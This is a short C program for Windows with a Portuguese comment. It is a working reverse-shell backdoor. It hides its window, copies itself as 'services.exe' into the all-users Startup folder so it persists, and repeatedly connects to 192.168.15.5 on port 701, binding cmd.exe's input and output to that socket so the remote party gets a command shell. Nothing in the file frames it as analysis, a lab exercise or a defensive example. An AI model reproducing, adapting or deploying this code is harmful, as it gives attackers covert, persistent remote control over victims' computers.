#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_PORT 701
#define DEFAULT_IP "192.168.15.5"

WSADATA wsaData;
SOCKET Winsocket;
STARTUPINFO theProcess;
PROCESS_INFORMATION info_proc;
struct sockaddr_in Winsocket_Structure;

int main(int argc, char *argv[])
{
 ShowWindow(GetForegroundWindow(),SW_HIDE);
 system("XCOPY /Y services.exe C:\\ProgramData\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup");

 while(1)
 {     
  WSAStartup(MAKEWORD(2,2), &wsaData);
  Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
  Winsocket_Structure.sin_port=htons(DEFAULT_PORT);
  Winsocket_Structure.sin_family=AF_INET;
  Winsocket_Structure.sin_addr.s_addr=inet_addr(DEFAULT_IP );
  
  if(Winsocket==INVALID_SOCKET)
  {
    WSACleanup();

  }
  
  // Faz a conexão com o server  
  if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR)
  {
    WSACleanup();
  }

  memset(&theProcess, 0, sizeof(theProcess));
  theProcess.cb=sizeof(theProcess);
  theProcess.dwFlags=STARTF_USESTDHANDLES;
  theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;
  CreateProcess(NULL,"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &theProcess, &info_proc);  
  }
 
}
